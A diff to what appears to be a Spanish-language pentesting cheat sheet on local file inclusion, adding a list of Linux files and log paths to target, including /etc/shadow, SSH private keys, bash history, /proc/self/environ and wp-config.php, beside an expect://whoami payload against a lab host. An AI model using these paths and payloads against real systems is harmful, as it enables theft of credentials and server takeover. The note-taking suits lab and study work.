@@ -127,6 +127,39 @@ http://victim.htb/file.php?recurse=expect://whoami
 
 ```
 
+## 'Archivos & Rutas' a tener en cuenta
+
+### Linux
+```
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/home/<user>/.ssh/id_rsa
+/home/<user>/.bash_history
+/etc/apache2/sites-available/000-default.conf
+/etc/httpd/logs/acces_log 
+/etc/httpd/logs/error_log 
+/var/www/logs/access_log 
+/var/www/logs/access.log 
+/usr/local/apache/logs/access_ log 
+/usr/local/apache/logs/access. log 
+/var/log/apache/access_log 
+/var/log/apache2/access_log 
+/var/log/apache/access.log 
+/var/log/apache2/access.log
+/var/log/access_log
+/proc/self/environ
+../wp-content/wp-config.php
+/www/apache/conf/httpd.conf
+```
+
+### Windows
+
+```
+Por completar
+```
+
+
 ## RCE EN LFI
 
 ### [Log Poisoning]
